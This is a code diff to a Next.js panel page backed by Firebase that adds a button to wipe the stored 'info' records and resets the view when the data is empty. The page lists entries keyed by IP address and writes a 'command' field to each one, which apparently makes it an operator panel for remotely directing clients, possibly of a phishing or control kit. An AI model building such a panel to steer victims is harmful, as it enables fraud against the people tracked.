@@ -1,7 +1,7 @@
 "use client";
 
 import { database } from "@/firebase";
-import { onValue, ref, update } from "firebase/database";
+import { onValue, ref, update, remove } from "firebase/database";
 import Image from "next/image";
 import { useEffect, useRef, useState } from "react";
 
@@ -48,6 +48,10 @@ export default function PanelPage() {
         });
         prevCountRef.current = dataSet;
         setDtInfo(JSON.stringify(dataSet));
+      } else {
+        setDataInfos({});
+        setDtInfo("");
+        prevCountRef.current = {};
       }
     });
 
@@ -70,6 +74,7 @@ export default function PanelPage() {
 
   const handleCommand = (cmd: string, ip: string, id: string) => {
     const infoRef = ref(database, `info/${ip}/${id}`);
+
     update(infoRef, { command: cmd });
   };
 
@@ -77,7 +82,20 @@ export default function PanelPage() {
     <>
       <main className="flex flex-col w-full h-[100vh] py-16 bg-zinc-800 text-zinc-200">
         <div className="flex flex-row w-full pb-24 px-10">
-          <div className="flex w-full rounded-xl">
+          <div className="flex flex-col gap-4 w-full rounded-xl">
+            <div className="flex flex-col w-48 items-center justify-center">
+              <button
+                onClick={() => {
+                  const infoRef = ref(database, `info`);
+                  remove(infoRef);
+                  setDataInfos({});
+                  setDtInfo("");
+                }}
+                className="flex bg-zinc-400 py-2 px-4 rounded-lg text-zinc-800 transition-all hover:bg-zinc-200 font-semibold text-base"
+              >
+                CLEAR DATA
+              </button>
+            </div>
             <table className="w-full text-sm text-left rtl:text-right text-gray-500 rounded-2xl shadow">
               <thead className="text-xs text-white uppercase bg-zinc-600 rounded-2xl">
                 <tr className="rounded-3xl">
